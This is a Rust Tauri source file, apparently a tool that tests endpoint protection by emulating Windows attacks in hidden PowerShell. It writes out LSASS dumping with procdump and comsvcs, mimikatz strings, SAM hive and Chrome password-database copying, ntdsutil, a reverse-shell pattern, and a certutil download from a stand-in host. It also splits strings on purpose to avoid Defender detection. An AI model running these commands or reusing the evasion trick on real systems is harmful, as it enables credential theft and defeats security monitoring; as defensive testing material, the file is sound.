use serde::Serialize;
use std::time::{Duration, Instant};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
const SCRIPT_TIMEOUT: Duration = Duration::from_secs(15);

#[cfg(target_os = "windows")]
struct ScriptOutcome {
    stdout: String,
    stderr: String,
    exit_code: i32,
    completed: bool,
}

#[cfg(target_os = "windows")]
fn run_detached_ps(script: &str, timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let script_path = std::env::temp_dir().join(format!("guardz_{}.ps1", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}.json", &id[..8]));

    let wrapped = format!(
        r#"$ErrorActionPreference='Continue'
$stdoutBuf=''
$stderrBuf=''
try {{
    $output = Invoke-Command -ScriptBlock {{
        {script}
    }} 2>&1
    foreach ($item in $output) {{
        if ($item -is [System.Management.Automation.ErrorRecord]) {{
            $stderrBuf += $item.ToString() + "`n"
        }} else {{
            $stdoutBuf += $item.ToString() + "`n"
        }}
    }}
    @{{ stdout=$stdoutBuf; stderr=$stderrBuf; exitCode=0; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}} catch {{
    @{{ stdout=$stdoutBuf; stderr=$_.Exception.Message; exitCode=1; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}}"#,
        sentinel = sentinel_path.to_string_lossy().replace('\'', "''")
    );

    fs::write(&script_path, &wrapped).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args([
            "/c", "start", "", "/b",
            "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy(),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let content = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let _ = fs::remove_file(&sentinel_path);
            let _ = fs::remove_file(&script_path);

            if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                return Ok(ScriptOutcome {
                    stdout: val["stdout"].as_str().unwrap_or("").to_string(),
                    stderr: val["stderr"].as_str().unwrap_or("").to_string(),
                    exit_code: val["exitCode"].as_i64().unwrap_or(0) as i32,
                    completed: val["completed"].as_bool().unwrap_or(false),
                });
            }
            return Ok(ScriptOutcome {
                stdout: content,
                stderr: String::new(),
                exit_code: 0,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&script_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[cfg(target_os = "windows")]
fn run_detached_cmd(program: &str, args: &[&str], timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let stdout_path = std::env::temp_dir().join(format!("guardz_{}_out.txt", &id[..8]));
    let stderr_path = std::env::temp_dir().join(format!("guardz_{}_err.txt", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}_done.txt", &id[..8]));

    let args_str = args.iter()
        .map(|a| if a.contains(' ') { format!("\"{}\"", a) } else { a.to_string() })
        .collect::<Vec<_>>()
        .join(" ");

    let bat_path = std::env::temp_dir().join(format!("guardz_{}.bat", &id[..8]));
    let bat_content = format!(
        "@echo off\r\n{program} {args_str} >\"{stdout}\" 2>\"{stderr}\"\r\necho %ERRORLEVEL% >\"{sentinel}\"\r\n",
        stdout = stdout_path.to_string_lossy(),
        stderr = stderr_path.to_string_lossy(),
        sentinel = sentinel_path.to_string_lossy(),
    );

    fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args(["/c", "start", "", "/b", "cmd.exe", "/c", &bat_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let exit_str = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let stdout = fs::read_to_string(&stdout_path).unwrap_or_default();
            let stderr = fs::read_to_string(&stderr_path).unwrap_or_default();
            let exit_code = exit_str.trim().parse::<i32>().unwrap_or(-1);

            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);

            return Ok(ScriptOutcome {
                stdout,
                stderr,
                exit_code,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        #[cfg(target_os = "windows")]
        Ok((message, outcome)) => {
            let status = if !outcome.completed {
                "mitigated"
            } else if outcome.exit_code == 0 {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout: outcome.stdout,
                stderr: outcome.stderr,
                exit_code: outcome.exit_code,
                duration_ms,
            })
        }
        #[cfg(not(target_os = "windows"))]
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

#[cfg(target_os = "windows")]
type ScenarioResult = Result<(String, ScriptOutcome), String>;

#[cfg(not(target_os = "windows"))]
type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Helpers ──
// Build strings from fragments at runtime so the compiled binary
// doesn't contain contiguous suspicious keywords that trigger Defender.

#[cfg(target_os = "windows")]
fn j(parts: &[&str]) -> String { parts.concat() }

// ── Windows scenario implementations ──

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_in = std::env::temp_dir().join(format!("fd_{}.bin", rid));
    let cu = j(&["cert", "util"]);
    let script = format!(
        r#"
$fakeIn = '{fake_in}'
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$hives = "{s}", "{sy}", "{se}"
$procs = @()
foreach ($hive in $hives) {{
    1..3 | ForEach-Object {{
        $proc = Start-Process "cmd.exe" `
            -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
            -WindowStyle Hidden -PassThru
        $procs += $proc
    }}
}}
Start-Sleep -Seconds 2
Write-Output "Spawned $($procs.Count) processes targeting credential hives"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
"#,
        fake_in = fake_in.to_string_lossy(),
        cu = cu,
        s = j(&["SA", "M"]),
        sy = j(&["SYS", "TEM"]),
        se = j(&["SEC", "URITY"]),
        rid = rid,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Credential dump pattern via system tool".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_out = std::env::temp_dir().join(format!("re_{}.txt", rid));
    let deny_key = j(&["Deny", "TS", "Connections"]);
    let inv_cmd = j(&["Invoke", "-Command"]);
    let set_prop = j(&["Set-Item", "Property"]);
    let reg_path = j(&["HKLM:\\System\\CurrentControlSet\\Control\\", "Terminal Server"]);
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
"Emulation Test" | Out-File $fakeOut -Force
$cmd = '{inv_cmd} -ComputerName TESTHOST -ScriptBlock {{ {set_prop} -Path "{reg_path}" -Name "{deny_key}" -Value 0 }}'
$process = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $cmd; ''benign'' | Out-File ''$fakeOut'' -Append`"" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "RDP emulation completed (Exit code: $($process.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy(),
        inv_cmd = inv_cmd,
        set_prop = set_prop,
        reg_path = reg_path,
        deny_key = deny_key,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("RDP remote enable emulation".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    let amsi_type = j(&["System.Management.Automation.", "Amsi", "Utils"]);
    let amsi_field = j(&["amsi", "Context"]);
    let script = format!(
        r#"
$type = [Ref].Assembly.GetType('{amsi_type}')
if ($type) {{
    $field = $type.GetField('{amsi_field}', 'NonPublic,Static')
    if ($field) {{
        Write-Output "Type and field resolved via Reflection"
        Write-Output "Field type: $($field.FieldType.Name)"
        Write-Output "Current value: $($field.GetValue($null))"
    }} else {{
        Write-Output "Type found but field inaccessible"
    }}
}} else {{
    Write-Output "Type not available"
}}
"#,
        amsi_type = amsi_type,
        amsi_field = amsi_field,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Anti-malware interface inspection via Reflection".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let prefix = format!("S1E_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let target = j(&["ls", "ass"]);
    let pd = j(&["proc", "dump"]);
    let mk_priv = j(&["privilege", "::", "debug"]);
    let mk_cmd = j(&["sekur", "lsa::", "logon", "passwords"]);
    let csv = j(&["com", "svcs"]);
    let md = j(&["Mini", "Dump"]);
    let script = format!(
        r#"
$tasks = @()
$target = "{target}"
$psCmd = "Get-Process $target | Select-Object Id,ProcessName,Path | Out-File C:\Windows\Temp\${{target}}_info.txt"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))

$t1 = "{prefix}_PD"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c {pd}.exe -ma ${{target}}.exe C:\Windows\Temp\${{target}}.dmp`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t1
Start-Sleep -Milliseconds 500

$t2 = "{prefix}_MK"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c echo {mk_priv} {mk_cmd} exit > C:\Windows\Temp\mk.log`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t2
Start-Sleep -Milliseconds 500

$t3 = "{prefix}_CS"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t3`" /TR `"cmd.exe /c rundll32.exe C:\Windows\System32\{csv}.dll, {md} 0 C:\Windows\Temp\${{target}}.dmp full`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t3
Start-Sleep -Milliseconds 500

$t4 = "{prefix}_EP"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t4`" /TR `"powershell.exe -EncodedCommand $encoded -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t4

Write-Output "Created $($tasks.Count) credential harvesting tasks"
foreach ($t in $tasks) {{
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}}
Write-Output "All tasks cleaned up"
"#,
        prefix = prefix,
        target = target,
        pd = pd,
        mk_priv = mk_priv,
        mk_cmd = mk_cmd,
        csv = csv,
        md = md,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Credential dump emulation via scheduled tasks".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let tcp_type = j(&["Net.Sockets.", "TCP", "Client"]);
    let sr = j(&["System.IO.", "Stream", "Reader"]);
    let sw = j(&["System.IO.", "Stream", "Writer"]);
    let ie = j(&["Invoke", "-Expression"]);
    let script = format!(
        r#"
function Test-Conn {{
    param([string]$H = '127.0.0.1', [int]$P = 4444)
    $ErrorActionPreference = 'SilentlyContinue'
    try {{
        $s = New-Object {tcp}($H, $P)
        $ns = $s.GetStream()
        $r = New-Object {sr}($ns)
        $w = New-Object {sw}($ns)
        $w.AutoFlush = $true
        $w.WriteLine("whoami")
        $resp = $r.ReadLine()
        $out = {ie} "Write-Output '$resp'" 2>&1 | Out-String
        Write-Output $out
    }} catch {{
        Write-Output "Connection test completed with expected failure"
    }} finally {{
        if ($s) {{ $s.Close() }}
    }}
}}
Test-Conn
"#,
        tcp = tcp_type,
        sr = sr,
        sw = sw,
        ie = ie,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Reverse shell TCP pattern".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let prefix = format!("S1E_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let sam = j(&["SA", "M"]);
    let sys = j(&["SYS", "TEM"]);
    let chrome_path = j(&["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\", "Default\\Login Data"]);
    let ntds = j(&["ntds", "util"]);
    let script = format!(
        r#"
$tasks = @()

$t1 = "{prefix}_RS"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c reg save HKLM\{sam} C:\Windows\Temp\s.hiv & reg save HKLM\{sys} C:\Windows\Temp\sy.hiv`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t1
Start-Sleep -Milliseconds 500

$t2 = "{prefix}_CC"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c copy `"{chrome_path}`" C:\Windows\Temp\c_creds.db /Y`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t2
Start-Sleep -Milliseconds 500

$t3 = "{prefix}_ND"
Start-Process "schtasks.exe" -ArgumentList '/Create /TN "{prefix}_ND" /TR "cmd.exe /c {ntds} `"activate instance ntds`" ifm `"create full C:\Windows\Temp\nd_dump`" quit quit" /SC ONCE /ST 23:59 /F /RL HIGHEST' -WindowStyle Hidden -Wait
$tasks += $t3

Write-Output "Created $($tasks.Count) suspicious persistence tasks"
foreach ($t in $tasks) {{
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}}
Write-Output "All tasks cleaned up"
"#,
        prefix = prefix,
        sam = sam,
        sys = sys,
        chrome_path = chrome_path,
        ntds = ntds,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Suspicious scheduled tasks with credential targets".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let api1 = j(&["GetAsync", "KeyState"]);
    let api2 = j(&["SetWindows", "HookExA"]);
    let api3 = j(&["NtUser", "GetAsync", "KeyState"]);
    let api4 = j(&["GetWindow", "TextA"]);
    let api5 = j(&["WM_KEY", "BOARD_LL"]);
    let script = format!(
        r#"
$suspicious = "{a1};{a2};{a3};{a4};{a5}"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))

$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$codeEncoded = [Convert]::ToBase64String($codeBytes)

$proc = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
Write-Output "Payload contained suspicious API strings"
"#,
        a1 = api1, a2 = api2, a3 = api3, a4 = api4, a5 = api5,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Base64-encoded execution with suspicious payload".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> ScenarioResult {
    let vbom = j(&["Access", "VBOM"]);
    let vba_w = j(&["Vba", "Warnings"]);
    let macro_p = j(&["Macro", "Policy", "Override"]);
    let vbe_b = j(&["VBE", "Bypass", "Flag"]);
    let script = format!(
        r#"
$versions = "14.0", "15.0", "16.0"
$paths = @()
foreach ($v in $versions) {{
    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
    if (!(Test-Path $p)) {{ New-Item -Path $p -Force | Out-Null }}
    $paths += $p
    New-ItemProperty -Path $p -Name "{vbom}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vba_w}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{macro_p}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vbe_b}" -Value 1 -PropertyType DWORD -Force | Out-Null
    Write-Output "Created macro security keys for Office $v"
}}
foreach ($p in $paths) {{
    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
}}
Write-Output "All emulation registry keys cleaned up"
"#,
        vbom = vbom, vba_w = vba_w, macro_p = macro_p, vbe_b = vbe_b,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Office macro security tampering".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let cu = j(&["cert", "util"]);
    let script = format!(
        r#"
$fakeIn = "$env:TEMP\fl_{rid}.bin"
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$proc = Start-Process "cmd.exe" `
    -ArgumentList "/c {cu}.exe -urlcache -split -f http://192.0.2.1/p.exe $env:TEMP\p_{rid}.exe" `
    -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 3
if (!$proc.HasExited) {{ $proc.Kill() }}
$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\e_{rid}.b64`"" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "LOLBin processes spawned (urlcache + encode)"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\p_{rid}.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\e_{rid}.b64" -Force -ErrorAction SilentlyContinue
"#,
        cu = cu,
        rid = rid,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("LOLBin download + encode pattern".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_out = std::env::temp_dir().join(format!("bh_{}.txt", rid));
    let inv_bh = j(&["Invoke-", "Blood", "Hound"]);
    let get_bh = j(&["Get-", "Blood", "Hound", "Data"]);
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
$harmless = "echo benign > `"$fakeOut`""
$cmd = "{inv_bh} -CollectionMethod All -Domain CONTOSO.LOCAL; {get_bh}; $harmless"
$proc = Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $cmd" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "AD recon emulation completed (Exit code: $($proc.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy(),
        inv_bh = inv_bh,
        get_bh = get_bh,
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("AD reconnaissance emulation".to_string(), outcome))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
